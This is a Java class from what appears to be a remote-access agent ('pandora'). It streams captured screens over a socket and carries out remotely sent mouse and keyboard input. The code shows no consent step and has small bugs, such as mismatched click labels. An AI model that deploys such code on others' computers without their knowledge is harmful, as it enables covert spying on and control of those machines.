package org.pandora.agent.control.impl;

import org.pandora.agent.Client;

import javax.imageio.ImageIO;
import java.awt.*;
import java.awt.event.InputEvent;
import java.awt.image.BufferedImage;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.util.Arrays;
import java.util.Base64;
import java.util.concurrent.ConcurrentHashMap;
import java.util.concurrent.atomic.AtomicInteger;

public class DesktopController {

    private final Client client;
    private final StringBuilder screens;
    private final ConcurrentHashMap<Integer, GraphicsDevice> graphicsDeviceHashMap;
    private final ConcurrentHashMap<GraphicsDevice, Integer> viewers;
    private int total;
    private long lastImage;
    private boolean sending;

    public DesktopController(final Client client) {
        this.client = client;
        this.screens = new StringBuilder();
        this.graphicsDeviceHashMap = new ConcurrentHashMap<>();
        this.viewers = new ConcurrentHashMap<>();
        this.lastImage = System.currentTimeMillis();
        this.sending = false;
        this.addScreens();
    }

    private void addScreens() {
        final AtomicInteger count = new AtomicInteger();
        Arrays.stream(GraphicsEnvironment.getLocalGraphicsEnvironment().getScreenDevices()).forEach(screenDevice -> {
            count.getAndIncrement();
            this.graphicsDeviceHashMap.put(count.get(), screenDevice);
            this.screens.append(count.get()).append(";").append(screenDevice.getDisplayMode().getWidth()).append("x").append(screenDevice.getDisplayMode().getHeight()).append("#");
        });
    }

    public void changeState(final String state, final String screen) {
        switch (state) {
            case "start":
                if (Integer.parseInt(screen) == -1)
                    this.client.getSocketUtils().write("desktop:" + this.client.getComputer().lastUuid + ":start:" + this.screens.toString());
                else {
                    if (this.graphicsDeviceHashMap.get(Integer.parseInt(screen)) != null) {
                        this.viewers.put(this.graphicsDeviceHashMap.get(Integer.parseInt(screen)), 1 + this.viewers.getOrDefault(this.graphicsDeviceHashMap.get(Integer.parseInt(screen)), 0));
                        this.total++;
                        if (!this.sending) this.run();
                    }
                }
                break;
            case "stop":
                if (this.graphicsDeviceHashMap.get(Integer.parseInt(screen)) != null) {
                    if (this.viewers.getOrDefault(this.graphicsDeviceHashMap.get(Integer.parseInt(screen)), 0) > 0)
                        this.viewers.put(this.graphicsDeviceHashMap.get(Integer.parseInt(screen)), 1 - this.viewers.getOrDefault(this.graphicsDeviceHashMap.get(Integer.parseInt(screen)), 0));
                    if (this.total > 0) this.total--;
                }
                break;
        }
    }

    private void run() {
        this.sending = true;
        while (this.total > 0 && this.sending) {
            if ((System.currentTimeMillis() - this.lastImage) > 1) {
                this.graphicsDeviceHashMap.keySet().forEach(number -> {
                    if (this.graphicsDeviceHashMap.get(number) != null && this.viewers.get(this.graphicsDeviceHashMap.get(number)) != null && this.viewers.get(this.graphicsDeviceHashMap.get(number)) > 0) {
                        final GraphicsDevice screenDevice = this.graphicsDeviceHashMap.get(number);
                        try {
                            final Robot robot = new Robot(screenDevice);
                            final BufferedImage bufferedImage = robot.createScreenCapture(screenDevice.getDefaultConfiguration().getBounds());
                            if (Client.class.getResource("/images/cursor.jpg") != null && MouseInfo.getPointerInfo() != null && MouseInfo.getPointerInfo().getDevice().equals(screenDevice)) {
                                final PointerInfo pointerInfo = MouseInfo.getPointerInfo();
                                final Rectangle bounds = pointerInfo.getDevice().getDefaultConfiguration().getBounds();
                                final Point virtualPoint = new Point(pointerInfo.getLocation());
                                virtualPoint.x -= bounds.x;
                                virtualPoint.y -= bounds.y;
                                if (virtualPoint.x < 0) virtualPoint.x *= -1;
                                if (virtualPoint.y < 0) virtualPoint.y *= -1;
                                bufferedImage.createGraphics().drawImage(ImageIO.read(Client.class.getResource("/images/cursor.jpg")), virtualPoint.x, virtualPoint.y, 24, 24, null);
                            }
                            final ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
                            ImageIO.write(bufferedImage, "jpg", byteArrayOutputStream);
                            this.client.getSocketUtils().write("desktop:" + this.client.getComputer().lastUuid + ":image:" + number + ":" + Base64.getEncoder().encodeToString(byteArrayOutputStream.toByteArray()));
                        } catch (final AWTException | IOException ignore) {
                        }
                    }
                });
                this.lastImage = System.currentTimeMillis();
            }
        }
        if (this.sending) this.sending = false;
    }

    public void receiveMouseMove(final String x, final String y, final String screen) {
        try {
            if (this.graphicsDeviceHashMap.get(Integer.valueOf(screen)) != null) {
                final GraphicsDevice graphicsDevice = this.graphicsDeviceHashMap.get(Integer.valueOf(screen));
                final Robot robot = new Robot(graphicsDevice);
                final double newX = graphicsDevice.getDisplayMode().getWidth() * Double.parseDouble(x);
                final double newY = graphicsDevice.getDisplayMode().getHeight() * Double.parseDouble(y);
                robot.mouseMove((int) newX, (int) newY);
            }
        } catch (final AWTException | NumberFormatException ignored) {
        }
    }

    public void receiveMousePressed(final String clickType, final String screen) {
        try {
            if (this.graphicsDeviceHashMap.get(Integer.valueOf(screen)) != null) {
                final GraphicsDevice graphicsDevice = graphicsDeviceHashMap.get(Integer.valueOf(screen));
                final Robot robot = new Robot(graphicsDevice);
                switch (clickType) {
                    case "PRIMARY":
                        robot.mousePress(InputEvent.BUTTON1_MASK);
                        break;
                    case "MIDDLE":
                        robot.mousePress(InputEvent.BUTTON2_MASK);
                        break;
                    case "SECOND":
                        robot.mousePress(InputEvent.BUTTON3_MASK);
                        break;
                }
            }
        } catch (final AWTException | NumberFormatException ignored) {
        }
    }

    public void receiveMouseReleased(final String clickType, final String screen) {
        try {
            if (this.graphicsDeviceHashMap.get(Integer.valueOf(screen)) != null) {
                final GraphicsDevice graphicsDevice = this.graphicsDeviceHashMap.get(Integer.valueOf(screen));
                final Robot robot = new Robot(graphicsDevice);
                switch (clickType) {
                    case "PRIMARY":
                        robot.mouseRelease(InputEvent.BUTTON1_MASK);
                        break;
                    case "MIDDLE":
                        robot.mouseRelease(InputEvent.BUTTON2_MASK);
                        break;
                    case "SECONDARY":
                        robot.mouseRelease(InputEvent.BUTTON3_MASK);
                        break;
                }
            }
        } catch (final AWTException | NumberFormatException ignored) {
        }
    }

    public void receiveKeyboardPressed(final String keyCode, final String screen) {
        try {
            if (this.graphicsDeviceHashMap.get(Integer.valueOf(screen)) != null) {
                final GraphicsDevice graphicsDevice = this.graphicsDeviceHashMap.get(Integer.valueOf(screen));
                final Robot robot = new Robot(graphicsDevice);
                robot.keyPress(Integer.parseInt(keyCode));
            }
        } catch (final AWTException | IllegalArgumentException ignored) {
        }
    }

    public void receiveKeyboardReleased(final String keyCode, final String screen) {
        try {
            if (this.graphicsDeviceHashMap.get(Integer.valueOf(screen)) != null) {
                final GraphicsDevice graphicsDevice = this.graphicsDeviceHashMap.get(Integer.valueOf(screen));
                final Robot robot = new Robot(graphicsDevice);
                robot.keyRelease(Integer.parseInt(keyCode));
            }
        } catch (final AWTException | IllegalArgumentException ignored) {
        }
    }
}